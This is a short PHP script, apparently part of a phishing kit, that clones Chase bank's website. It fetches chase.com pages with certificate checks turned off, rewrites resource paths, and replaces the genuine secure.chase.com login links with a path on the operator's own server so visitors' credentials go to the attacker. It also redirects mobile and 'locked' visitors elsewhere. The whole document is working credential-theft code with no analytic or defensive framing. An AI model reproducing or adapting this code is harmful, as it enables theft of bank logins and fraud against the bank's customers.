<?php error_reporting(0); // Made by pxbble
if (file_get_contents("status.nil") == "Locked") {
    header ("Location: /web/note?form=locked");
}
if (strpos($_SERVER['HTTP_USER_AGENT'], "Mobile") !== false) {
    header ("Location: /web/note?form=mobile");
}
$url = "https://www.chase.com/pebble";
$config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$content = curl_exec($ch);
curl_close($ch);
$content = str_replace("/c/", "https://www.chase.com/c/", $content);
$content = str_replace("/etc/", "https://www.chase.com/etc/", $content);
$content = str_replace("/content/dam/u", "https://www.chase.com/content/dam/u", $content);
$content = str_replace("https://secure.chase.com", "https://$_SERVER[SERVER_NAME]/web/auth", $content);
echo $content;